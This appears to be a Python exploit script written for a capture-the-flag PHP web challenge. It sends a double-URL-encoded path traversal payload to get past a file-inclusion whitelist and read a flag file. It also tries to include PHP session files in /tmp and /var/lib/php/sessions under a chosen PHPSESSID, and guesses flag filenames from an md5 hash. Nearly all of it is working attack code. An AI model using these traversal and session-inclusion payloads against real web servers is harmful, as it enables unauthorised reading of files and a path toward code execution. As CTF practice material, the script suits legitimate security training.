# -*- coding: utf-8 -*-
"""看 370 响应的完整内容 + session 注入测试"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

print('=== 双编码 payload 完整响应 ===')
r = requests.post(base + '/', data={'file': 'source.php%253f/../../ffffllllaaaagggg.php'}, timeout=10)
print(f'长度: {len(r.text)}')
print(r.text[:600])
print()

print('=== session 注入思路：自定义 PHPSESSID + file 参数 ===')
# PHP session 文件在 /tmp/sess_xxx，尝试包含
payloads = [
    'hint.php%253f/../../../../../../../../tmp/sess_' + 'TESTPHPSESSID',
    'hint.php%253f/../../../../../../../../var/lib/php/sessions/sess_' + 'TESTPHPSESSID',
]
for p in payloads:
    r = requests.post(base + '/', data={'file': p},
                      cookies={'PHPSESSID': 'TESTPHPSESSID'}, timeout=10)
    print(f'  {p[:60]}... -> len={len(r.text)}')
    if len(r.text) > 400:
        print(f'    内容: {r.text[:150].replace(chr(10), " ")}')
print()

print('=== secretkey 作为提示：直接拼入 flag 路径 ===')
# 有些题 flag 文件名就是 key 的 md5
import hashlib
key = 'you-will-never-guess'
print(f'  key: {key}')
print(f'  md5(key): {hashlib.md5(key.encode()).hexdigest()}')
# 试常见组合
for name in [hashlib.md5(key.encode()).hexdigest(), hashlib.md5(key.encode()).hexdigest()[:16]]:
    r = requests.get(base + '/' + name + '.php', timeout=8)
    print(f'  /{name}.php: {r.status_code}')
